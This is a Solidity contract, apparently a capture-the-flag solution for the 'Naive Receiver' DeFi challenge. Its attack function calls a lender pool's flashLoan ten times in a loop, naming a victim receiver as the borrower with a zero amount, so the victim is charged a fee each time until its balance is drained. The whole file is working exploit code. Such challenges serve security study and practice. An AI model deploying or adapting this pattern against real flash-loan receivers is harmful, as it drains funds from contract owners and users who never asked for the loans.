// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "./NaiveReceiverLenderPool.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract NaiveReceiverAttacker {
    function attack(address payable pool, address victim) public {
        for (uint i; i < 10; i++) {
            NaiveReceiverLenderPool(pool).flashLoan(
                IERC3156FlashBorrower(victim),
                0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE,
                0,
                "0x0"
            );
        }
    }
}
